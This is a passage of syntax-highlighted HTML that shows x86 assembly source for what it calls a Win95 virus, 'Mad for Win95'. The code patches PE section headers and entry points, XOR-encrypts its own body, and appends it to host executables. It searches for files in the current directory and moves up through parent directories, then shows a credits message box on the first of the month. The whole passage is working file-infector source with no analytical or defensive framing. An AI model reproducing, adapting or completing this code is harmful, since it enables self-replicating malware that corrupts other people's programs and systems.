       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">InfectionMark</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'WDAM'</span><span class="sc0">         </span><span class="sc1">;MADW - Mad for Win95</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">error_close</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">NumberSections</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BB8h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FileAlign</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">szRVA</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;virtual size of section</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7D0h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">ObjAlign</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pRAW</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;pointer to raw data</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">szRAW</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;size of raw data</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pRAW</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;pointer to raw data</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">ObjAttr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C0000040h</span><span class="sc0">        </span><span class="sc1">;object attributes</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">RVA</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;RVA of section</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">EntryRVA</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">EntryRVA</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">old_RVA</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">InfectionMark</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'WDAM'</span><span class="sc0">         </span><span class="sc1">;set the mark</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">PEPointer</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">file_seek</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEHeader</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8D0h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">                           </span><span class="sc1">;write the modificated</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                   </span><span class="sc1">;header info</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Seed</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">file_seek</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Seed</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Key</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EncriptedBody</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AB0h</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                                </span><span class="sc1">;zopy virus to work area</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EncriptedBody</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">45h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A6Bh</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Key</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">enc_loop</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                             </span><span class="sc1">;encript it</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">enc_loop</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EncriptedBody</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AB0h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">                           </span><span class="sc1">;attach virus</span><span class="sc0">

</span><span class="sc5">error_close</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">Seed</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_CloseFile</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">_check_payload</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FileHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">find_next</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_FNFile</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">_check_payload</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FINDATA</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">SearchHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">infect_next</span><span class="sc0">

</span><span class="sc5">change_dir</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">TotalInf</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">;only stop after 3 directorys</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">_check_payload</span><span class="sc0">                   </span><span class="sc1">;infected</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_SetDir</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">_check_payload</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DotDot</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;go down a directory</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">TotalInf</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">find_filez</span><span class="sc0">

</span><span class="sc5">_check_payload</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">check_payload</span><span class="sc0">

</span><span class="sc5">read_file</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_ReadFile</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rf_addr_ok</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
       </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">rf_addr_ok</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NumRead</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FileHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">write_file</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">wf_addr_ok</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">
       </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">wf_addr_ok</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NumRead</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FileHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">file_seek</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_FileSeek</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">FileHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">check_payload</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_GetTime</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYSTIME</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">cDay</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_User32</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pGetModuleHdle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;get handle for USER32.DLL</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_MsgBox</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_payload</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1030h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MsgTitle</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MsgText</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                  </span><span class="sc1">;pop a MessageBox with virus</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_Kernel32</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;credits</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">pGetModuleHdle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">KernelHandle</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_SetDir</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_api_addr</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">return_host</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">return_host</span><span class="sc4">:</span><span class="sc0">
